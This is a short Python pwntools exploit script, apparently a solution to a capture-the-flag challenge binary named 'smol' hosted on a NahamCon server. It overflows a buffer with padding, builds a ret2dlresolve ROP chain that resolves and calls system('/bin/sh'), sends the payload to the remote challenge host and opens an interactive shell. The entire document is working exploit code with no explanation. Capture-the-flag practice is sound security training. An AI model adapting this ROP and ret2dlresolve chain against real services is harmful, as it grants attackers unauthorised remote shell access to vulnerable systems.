#!/usr/bin/python
import pwn

elf = pwn.ELF("smol")
pwn.context.binary = elf
pwn.context.terminal = "xterm"
pl = pwn.Ret2dlresolvePayload(elf, "system", ["/bin/sh", 0])
rop = pwn.ROP(elf)
rop.read(0, pl.data_addr)
rop.ret2dlresolve(pl)
print("%x" % pl.data_addr)

chain = rop.chain()
zob = b"A"*12 + chain
zob += b"\x00"*(512-len(zob))
payload = pwn.fit(zob + pl.payload)
"""
p = pwn.process(["gdb",  "smol"])
p.sendline("start")
p.sendline("break *0x00007ffff7e05cf3")
p.sendline("continue")
#p = pwn.process("smol")
"""
p = pwn.remote("challenge.nahamcon.com", 31118)
p.sendline(payload)
p.interactive()
